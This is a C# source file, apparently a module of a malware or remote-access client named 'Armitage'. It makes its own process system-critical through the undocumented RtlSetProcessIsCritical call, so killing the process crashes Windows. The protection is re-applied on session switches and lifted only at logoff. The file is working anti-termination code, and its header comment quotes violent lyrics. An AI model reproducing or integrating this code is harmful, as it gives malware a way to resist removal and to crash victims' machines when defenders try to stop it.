using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// Turns this letter into something more important.
    /// <i>
    /// Remember I will always love you,
    /// As I claw your fucking throat away.
    /// It will end no other way.
    /// </i>
    /// </summary>
    public static class Critical_Process
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        [DllImport("advapi32.dll", SetLastError = true)]

        private static extern bool SetKernelObjectSecurity(
             IntPtr handle,
             int securityInformation,
             [In] byte[] securityDescriptor
         );

        /// <summary>
        /// Flag for maintaining the state of protection.
        /// </summary>
        private static volatile bool s_isProtected = false;

        /// <summary>
        /// For synchronizing our current state.
        /// </summary>
        private static ReaderWriterLockSlim s_isProtectedLock = new ReaderWriterLockSlim();

        /// <summary>
        /// Gets whether or not the host process is currently protected.
        /// </summary>
        public static bool IsProtected
        {
            get
            {
                try
                {
                    s_isProtectedLock.EnterReadLock();

                    return s_isProtected;
                }
                finally
                {
                    s_isProtectedLock.ExitReadLock();
                }
            }
        }

        /// <summary>
        /// If not already protected, will make the host process a system-critical process so it
        /// cannot be terminated without causing a shutdown of the entire system.
        /// </summary>
        public static void Protect()
        {
            Debug.WriteLine("Protected");
            try
            {
                /// Protect Shutdown so it won't be a bluescreen.
                SystemEvents.SessionEnding += UserLoggingOut;

                SystemEvents.SessionEnded += UserLoggingOut;

                SystemEvents.SessionSwitch += UserChanged;

                Console.WriteLine("Entering Write Lock");

                s_isProtectedLock.EnterWriteLock();

                if (!s_isProtected)
                {
                    System.Diagnostics.Process.EnterDebugMode();

                    RtlSetProcessIsCritical(1, 0, 0);

                    s_isProtected = true;
                }
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }

        /// <summary>
        /// Gets called whenever the user is changed.
        /// </summary>
        private static void UserChanged(object sender, SessionSwitchEventArgs e)
        {
            Protect();
        }

        /// <summary>
        /// Gets called when the user logged out.
        /// </summary>
        private static void UserLoggingOut(object sender, object e)
        {
            Unprotect();
        }

        /// <summary>
        /// If already protected, will remove protection from the host process, so that it will no
        /// longer be a system-critical process and thus will be able to shut down safely.
        /// </summary>
        public static void Unprotect()
        {
            try
            {
                s_isProtectedLock.EnterWriteLock();

                RtlSetProcessIsCritical(0, 0, 0);
                s_isProtected = false;
                Process.GetCurrentProcess().Kill();
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }
    }
}
